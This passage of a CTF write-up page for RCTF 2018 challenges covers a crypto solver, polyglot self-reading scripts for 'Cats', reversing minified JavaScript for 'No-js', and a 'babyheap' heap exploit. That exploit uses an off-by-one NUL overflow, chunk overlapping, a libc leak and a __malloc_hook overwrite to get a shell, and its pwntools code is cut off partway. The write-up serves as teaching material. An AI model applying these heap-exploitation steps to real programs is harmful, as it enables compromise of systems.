</span></span><span class=line><span class=cl><span class=n>xmm_values</span><span class=o>.</span><span class=n>extend</span><span class=p>([</span><span class=mh>0xAAAAAAAAAA975D1C</span><span class=p>,</span><span class=mh>0xA2845FE0B3096F8E</span><span class=p>][::</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>xmm_values</span><span class=o>.</span><span class=n>extend</span><span class=p>([</span><span class=mh>0x55555555555559A3</span><span class=p>,</span><span class=mh>0x55555555555559A3</span><span class=p>][::</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>xmm_values</span><span class=o>.</span><span class=n>extend</span><span class=p>([</span><span class=mh>0x55555555555559A3</span><span class=p>,</span><span class=mh>0x55555555555559A3</span><span class=p>][::</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>xmm_values</span><span class=o>.</span><span class=n>extend</span><span class=p>([</span><span class=mh>0x55555555555559A3</span><span class=p>,</span><span class=mh>0x55555555555559A3</span><span class=p>][::</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>xmm_values</span><span class=o>.</span><span class=n>extend</span><span class=p>([</span><span class=mh>0x55555555555559A3</span><span class=p>,</span><span class=mh>0x55555555555559A3</span><span class=p>][::</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=n>length</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>xrange</span><span class=p>(</span><span class=n>length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=nb>int</span><span class=p>((</span><span class=n>xmm_values</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>*</span> <span class=nb>int</span><span class=p>(</span><span class=nb>pow</span><span class=p>(</span><span class=n>multipl</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=o>-</span> <span class=mi>1</span><span class=p>,</span> <span class=n>mod_value</span><span class=p>)))</span> <span class=o>%</span> <span class=n>mod_value</span><span class=p>))[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>flag</span><span class=p>))</span>
</span></span></code></pre></div><pre><code>flag{stay_prime_stay_invertible_away_from_bruteforce}UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU
</code></pre><h2 class="relative group">Cats<div id=cats class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#cats aria-label=Anchor>#</a></span></h2><h3 class="relative group">Overview<div id=overview-4 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#overview-4 aria-label=Anchor>#</a></span></h3><p>We have a webform that let&rsquo;s us submit a list of cat food and a list of cat names.</p><p>It saves the cat food list to a file named <code>food</code> and then for each cat name, it runs the command</p><p><code>docker run -it --rm --network none -v /tmp/yourCatFood:/app/food:ro rctf_cats bash -c "timeout 5 diff -Z &lt;(cat food) &lt;(eachCatNameYouProvided food)</code></p><p>We can download the dockerfile of the challenge environment, so we build the container and look for what commands we can use.</p><p>We list the binaries for each location in the $PATH variable</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=nv>$PATH</span>
</span></span><span class=line><span class=cl>-&gt; /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
</span></span></code></pre></div><p>and we get this list <a href=https://pastebin.com/WRkbFmmw target=_blank>https://pastebin.com/WRkbFmmw</a></p><h3 class="relative group">Solution<div id=solution-3 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-3 aria-label=Anchor>#</a></span></h3><p>We noticed that there are a lot of sh-like commands (many are just symlinks):</p><p><code>sh,dash,rbash,bash</code></p><p>If we put <code>cat food</code> as food we will get 4 cat names at the cost of 1.</p><p>Then we looked for other cat-like programs, since choosing <code>cat food</code> as food limits our possibilities to use other interpreters.</p><p>We found at first <code>tail,head,sort,tac,uniq</code> which are identical to cat in this case</p><p>Then we found some exotic commands like <code>zmore,more,splain,expand,unexpand,fold</code></p><p>So in the end we submitted
<code>cat food</code></p><p><code>sh,dash,rbash,bash,zmore,more,splain,expand,unexpand,fold,tail,head,sort,tac,uniq</code></p><p>And got</p><pre tabindex=0><code>Wew, you&#39;ve found 15 cats! Here is your flag: RCTF{you_love_cats_dont_you}. If you can find at least 4 out of 5 cats whose names in (python3, bash, php, node, ruby), I will give you another flag ._.
</code></pre><p>Time for another challenge ._.</p><h3 class="relative group">Notes<div id=notes class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#notes aria-label=Anchor>#</a></span></h3><p>You&rsquo;ll spend a lot of time fighting re-captcha</p><h2 class="relative group">Cats Rev. 2<div id=cats-rev-2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#cats-rev-2 aria-label=Anchor>#</a></span></h2><h3 class="relative group">Overview<div id=overview-5 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#overview-5 aria-label=Anchor>#</a></span></h3><p><code>If you can find at least 4 out of 5 cats whose names in (python3, bash, php, node, ruby), I will give you another flag ._.</code></p><p>Same as Cats, but this time we need to make the file an executable polyglot to make it work with those commands.</p><p>Our objective is to make the file read itself.</p><h3 class="relative group">Solution<div id=solution-4 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-4 aria-label=Anchor>#</a></span></h3><p>We need to choose 4 of the 5 commands to work with. PHP is easy, since if the file does not contain any PHP code the command will just print out the contents of the file. One done.</p><p>Let&rsquo;s work with Python. A useful feature in Python is the multiline comment: using three single quotes lets us comment many lines of code in Python, while at the same time leaves these lines valid for other languages. For example in Ruby and Bash four quotes are equivalent to two concatenated empty strings and are perfectly valid.</p><p>We can make some space for ruby and bash code in the comment, while calling the system function to make Python read the file itself.</p><pre tabindex=0><code>a = &#39;&#39;&#39;&#39;
# bash and ruby code here
&#39; &#39;&#39;&#39;
import os; os.system(&#39;cat food&#39;)
</code></pre><p>We now want to write some code that is valid for both Bash and Ruby.</p><p>The &lsquo;!&rsquo; operator in Bash evaluates a command and inverts the exit code, while in Ruby it&rsquo;s a normal &ldquo;is false&rdquo; operator. We can use this to make an if to distinguish the two cases, then make the script exit immediately after reading the file to avoid syntax errors.</p><p>Final version:</p><pre tabindex=0><code>a=&#39;&#39;&#39;&#39;
test=true
if ! test ;
then
        cat food; exit 0
fi
end
exec(&#39;cat food&#39;)
&#39; &#39;&#39;&#39;
import os; os.system(&#39;cat food&#39;)
</code></pre><p>Working cats:</p><pre tabindex=0><code>tail,head,dash,sh,zmore,more,splain,uniq,expand,rbash,fold,python3,ruby,php,bash
</code></pre><h2 class="relative group">No-js<div id=no-js class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#no-js aria-label=Anchor>#</a></span></h2><h3 class="relative group">Overview<div id=overview-6 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#overview-6 aria-label=Anchor>#</a></span></h3><p>We&rsquo;re greeted with a password prompt. Our objective is to find the correct password.</p><p>The page is written in React, let&rsquo;s look at the source code and try to understand how the password is checked.</p><p>The source code is sadly minified, all functions and variables are one or two letter long. This made reversing the code quite harder.</p><p>We anyhow understand that the password is like <code>RCTF{XXX_XXX_XXX_XXX_XXX_XXX_XXX}</code>.
The password is split over the underscores, then the 7 individual pieces are checked separatedly with different expressions.</p><p>For reference, we&rsquo;re talking about the section of code that starts like</p><pre tabindex=0><code>   var sg = new Y(null, 7, 5, Z, [function (a) {
        return K.f(a, &#34;no&#34;)
    }, function (a) {
        return K.f(0, Kd(new Y(null, 10, 5, Z, [45, 36, 57, 36, 54, 38, 53, 1, 51, 55], null), li(a)))
    }, function (a) {
        return K.f(mi(a), &#34;0SWCRMLH&#34;)
    }, function (a) {
        return K.f(mi(a), &#34;000EQTPI&#34;)
    }, Bk, function (a) {
    [...]
</code></pre><p>Let&rsquo;s walk over them one by one.</p><h4 class="relative group">Word 1<div id=word-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#word-1 aria-label=Anchor>#</a></span></h4><p>The function <code>K.f</code> is just an equality check.
The first word is therefore <code>no</code>.</p><h4 class="relative group">Word 2<div id=word-2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#word-2 aria-label=Anchor>#</a></span></h4><p><code>Y</code> is just a wrapper for the object passed as fifth argument.
The check basically forces <code>li(word)</code> to be equal to [45, 36, 57, 36, 54, 38, 53, 1, 51, 55].
Looking at the function <code>li</code> we can see that it works char by char, and is thus easily bruteforced and inverted.</p><p>The second word is <code>javascr1pt</code>.</p><h4 class="relative group">Words 3 and 4<div id=words-3-and-4 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#words-3-and-4 aria-label=Anchor>#</a></span></h4><p>The third and fourth checks both use the function <code>mi</code>.</p><p>There&rsquo;s a lot of boilerplate, but after some reversing we can see that:</p><ul><li>The function <code>mi</code> takes a string and splits it in blocks of 5 chars.</li><li>For each block a 8-chars long string is built.</li><li>The new string is made by computing combinations of bits of the 5 input byes and using those as index on &ldquo;765432ABCDEFGHIJKLMNOPQRSTUVWXYZ&rdquo;.</li><li>The string is finally padded with &lsquo;0&rsquo;s.</li></ul><p>This function is also easily invertible.
We find the original bytes for &ldquo;0SWCRMLH&rdquo; and &ldquo;000EQTPI&rdquo; and we get two new words, <code>lets</code> and <code>use</code>.</p><h4 class="relative group">Word 5<div id=word-5 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#word-5 aria-label=Anchor>#</a></span></h4><p>The fifth check is a call to the function <code>Bk</code>.
<code>Bk</code> makes an eval on a string, which we find out is equivalent to an equality between two BigInts, one fixed and one derived from our input.
The latter is returned from <code>Ak(a)</code>.</p><p><code>Ak</code> contains lots of complex operations, but by looking up on google some of the numbers used, we find out they are md5 constants. <code>Ak</code> is most probably an md5 digest.</p><p>The check passes if <code>Bk</code> returns 270350715534787783724753109733385149467, which in hex is 0xcb63a762f1571806222efef7ec7f9c1b, i.e. the md5 hash of &lsquo;50me&rsquo;. We test it and the check passes.</p><p>The fifth word is <code>50me</code>.</p><h4 class="relative group">Word 6<div id=word-6 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#word-6 aria-label=Anchor>#</a></span></h4><p>This check is a maze of callbacks and was awful to reverse.</p><p>To begin we can see that the value returned by calling an inline function on our input must be equal to [21104, 50328, 78128, 119488, 411168, 592832].</p><p>Since the function is a little too complex we decided to do some black-box analysis.
With some tests we can see that the array which is returned contains a number for every 2 chars contained in the input.
Even better, every 2 chars correspond to a single value, that is then multiplied by 2^(index) in the array itself.</p><p>Since the check is computed 2 chars at a time, this is again bruteforceable.
The sixth word is <code>funcccTional</code>.</p><h4 class="relative group">Word 7<div id=word-7 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#word-7 aria-label=Anchor>#</a></span></h4><p>This check is another maze of callbacks, so we decided to make some top-level assumptions to simplify the analysis.</p><ul><li>There&rsquo;re a lot of &ldquo;type conversions&rdquo;, that don&rsquo;t change the inner value of a variable, we consider them js primitives to determine the logic</li><li>There&rsquo;s an abuse of the <code>Re</code> function, we assume all parameters except the first one are arrays of ints (verified with Chrome Dev Tools in some cases)</li></ul><p>Using a top-down approach:</p><ul><li><code>K.f</code> checks that the output of <code>window.btoa</code> is equals to a given base64 encoded string</li><li><code>fi(a, b)</code> turns out to be <code>b.join(a)</code></li><li>The next couple of <code>Re()</code> convert an array of int into an array of chars</li><li>The next 3 callbacks are ensuring we are passing one char at a time, and doing some weird type conversions that we ignored. The only important part is knowing that our input is passed through <code>li()</code>.</li><li>Once we arrive at <code>function (a, c, d, e) {</code>, we see a static argument calculated as: <code>xe(hd, xe(hd, be(22, 33), li("okotta")), new Y(null, 3, 5, Z, [11, 45, 14], null))</code>. We evaluated it using Chrome Dev Tools, it looks like a linked-list of the following numbers: <code>14 45 11 36 55 55 50 46 50 22 33</code></li><li>We move inside <code>function (a, c) {</code>, ignoring all the other wrappers/type convertions</li><li><code>if (Cd(a)) {</code> is always false, ignore body</li><li><code>g = N(a);</code> fetchs the first element of <code>a</code> (input array)</li><li><code>ed(c + g, w(Hc(a)))</code> calculated the sum of <code>c + g</code>, <code>Hc(a)</code> removes the first element of <code>a</code></li></ul><p>At a top level, the scripts does:</p><ul><li>Split the input in an array of int (using chartCode)</li><li>Passing the array through <code>li()</code></li><li>Doing a sum of every element of the array, with every element of our static linked-list (<code>14 45 11 36 55 55 50 46 50 22 33</code>)</li><li>Concatenating the results into a string</li><li>Base64 encoding the string</li><li>Matching the string with the given one</li></ul><p>At this point, we can reverse the algorithm with a quick python script:</p><pre tabindex=0><code>##!/usr/bin/env python2
import base64

target = [ord(x) for x in base64.b64decode(&#34;PVw6U2ZmYV1hRVAyUS9IW1tWUlY6RTJRL0hbW1ZSVjpFMlEvSFtbVlJWOkUyUS9IW1tWUlY6RT9ePFVoaGNfY0dSP148VWhoY19jR1IePRs0R0dCPkImMUZlQ1xvb2pmak5ZMlEvSFtbVlJWOkU4VzVOYWFcWFxASzZVM0xfX1pWWj5JNlUzTF9fWlZaPkk2VTNMX19aVlo+STZVM0xfX1pWWj5JDy4MJTg4My8zFyI=&#34;)]
sub = [14, 45, 11, 36, 55, 55, 50, 46, 50, 22, 33]

reversePartOne = []
i = 0
while i &lt; len(target):
    reversePartOne.append(target[i] - sub[0])
    i = i+11

def li(a):
    if 57 &gt;= a:
        return a - 48
    else:
        if 90 &gt;= a:
            return a - 65 + 10
        else:
            if 122 &gt;= a:
                return a - 97 + 36
            else: return None

inv = {}
for a in range(0, 256):
    inv[li(a)] = a

print &#39;&#39;.join(chr(inv[x]) for x in reversePartOne)
</code></pre><p>The last word is: <code>laaaannGuageeee1</code></p><h3 class="relative group">Solution<div id=solution-5 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-5 aria-label=Anchor>#</a></span></h3><p>Final solution: <code>RCTF{no_javascr1pt_lets_use_50me_funcccTional_laaaannGuageeee1}</code></p><h2 class="relative group">babyheap<div id=babyheap class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#babyheap aria-label=Anchor>#</a></span></h2><h3 class="relative group">Overview<div id=overview-7 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#overview-7 aria-label=Anchor>#</a></span></h3><p>We&rsquo;re given a 64-bit Linux ELF and its libc (2.23). Checksec shows full RELRO, canaries, NX and PIE.</p><p>During initialization, a randomly-sized chunk is allocated on the heap to shift the user allocations by a random offset. Then, the program shows a basic menu:</p><pre tabindex=0><code>1. Alloc
2. Show
3. Delete
4. Exit
</code></pre><p>We can allocate up to 32 heap chunks with size up to 256. They are <code>calloc</code>ed and then populated with user input. The show option prints the content (as a string), and the delete option frees the chunk.</p><h3 class="relative group">Vulnerability<div id=vulnerability class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#vulnerability aria-label=Anchor>#</a></span></h3><p>There is an off-by-one vulnerability in the function at 0xBC8, which reads user input. If the user input has the exact same size as the destination buffer, a NUL terminator will overflow the buffer.</p><h3 class="relative group">Exploitation<div id=exploitation class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#exploitation aria-label=Anchor>#</a></span></h3><p>Exploitation is straightforward. We abused the NUL byte overflow via a <a href=https://heap-exploitation.dhavalkapil.com/attacks/shrinking_free_chunks.html target=_blank>free chunk shrinking attack</a>. Specifically, we get overlaps for two chunks:</p><ul><li>An allocated smallchunk, for leaking libc;</li><li>A freed 0x70 fastchunk, for a fastbin attack.</li></ul><p>To leak libc, we can allocate a smallchunk (let&rsquo;s call it <code>unsorted</code>) that overlaps the previously allocated smallchunk (let&rsquo;s call it <code>leak</code>). Then, we free <code>unsorted</code> and use the show option on <code>leak</code> to get the <code>fd</code> pointer of <code>unsorted</code>. Since it is in the unsorted bin, its <code>fd</code> will point within <code>main_arena</code> in libc.</p><p>Now that we have libc, our goal is to link a fake fastchunk near <code>__malloc_hook</code>. Due to the presence of NULL pointers and valid libc pointers (0x7f top byte) before the hook, the qword at <code>&__malloc_hook-27</code> is exactly 0x7f. Since fastchunk sizes don&rsquo;t have to be aligned, this is a valid fastchunk header. We allocate a chunk that overlaps the freed 0x70 fastchunk from earlier, and we reconstruct it (it was zeroed by <code>calloc</code>) with an <code>fd</code> pointing to <code>&__malloc_hook-27-8</code> (<code>prev_size</code> is included). Now the fake fastchunk near the hook is linked in the 0x70 fastbin. We allocate a 0x70 fastchunk to bring the fake one to the fastbin head, and finally allocate the fake fastchunk. Now we simply overwrite <code>__malloc_hook</code> with a suitable onegadget (0x4526a in libc works), and obtain a shell on the next allocation.</p><h3 class="relative group">Exploit code<div id=exploit-code class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#exploit-code aria-label=Anchor>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;babyheap.2018.teamrois.cn&#39;</span><span class=p>,</span> <span class=mi>3154</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chunks</span> <span class=o>=</span> <span class=p>[</span><span class=kc>False</span><span class=p>]</span><span class=o>*</span><span class=mi>32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>menu</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;choice: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>n</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>alloc</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>final</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;size: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>final</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;content: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>content</span> <span class=o>+</span> <span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span> <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>content</span><span class=p>)</span> <span class=o>&lt;</span> <span class=n>size</span> <span class=k>else</span> <span class=s1>&#39;&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=n>chunks</span><span class=o>.</span><span class=n>index</span><span class=p>(</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>chunks</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>idx</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;index: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;content: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>1. Alloc&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>1. Alloc&#39;</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>content</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;index: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>chunks</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Setting up heap layout&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># layout: 0x18 (alloc) | 0x220 (free) | 0x110 (alloc)</span>
</span></span><span class=line><span class=cl><span class=n>bottom</span> <span class=o>=</span> <span class=n>alloc</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>gap1</span> <span class=o>=</span> <span class=n>alloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>gap2</span> <span class=o>=</span> <span class=n>alloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>,</span> <span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0xe0</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x200</span><span class=p>))</span> <span class=c1># shrunk prev_size</span>
</span></span><span class=line><span class=cl><span class=n>top</span> <span class=o>=</span> <span class=n>alloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=n>gap1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=n>gap2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Shrinking free chunk&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=n>bottom</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># off-by-one NUL overflow into the 0x220 free chunk</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span> <span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Overlapping chunks&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>head</span> <span class=o>=</span> <span class=n>alloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>alloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>)</span> <span class=c1># for unsorted leak</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=n>alloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>))</span> <span class=c1># for fastbin attack</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=n>head</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=n>top</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Leaking libc&#39;</span><span class=p>)</span>
